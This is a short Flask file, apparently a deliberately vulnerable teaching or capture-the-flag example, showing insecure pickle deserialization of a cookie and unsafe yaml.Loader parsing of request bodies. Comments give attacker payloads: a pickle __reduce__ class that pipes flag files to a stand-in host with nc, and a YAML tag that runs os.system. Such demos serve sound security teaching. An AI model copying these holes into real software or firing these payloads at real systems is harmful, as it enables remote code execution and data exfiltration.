# Flask

import base64
import pickle
import yaml
from flask import Flask, request, make_response

app = Flask(__name__)

# Vuln 1: sesion casera guardada como pickle en una cookie
@app.get("/dashboard")
def dashboard():
    data = pickle.loads(base64.b64decode(request.cookies["prefs"]))
    return f"theme: {data['theme']}"

# Payload (atacante):
# class X:
#     def __reduce__(self):
#         import os
#         return (os.system, ("cat /data/flags/* | nc attacker 4444",))
# base64.b64encode(pickle.dumps(X()))

# Vuln 2: import de configuracion en YAML con el loader completo
@app.post("/import")
def import_cfg():
    cfg = yaml.load(request.data, Loader=yaml.Loader)
    # !!python/object/apply:os.system ["id"]
    return str(cfg)
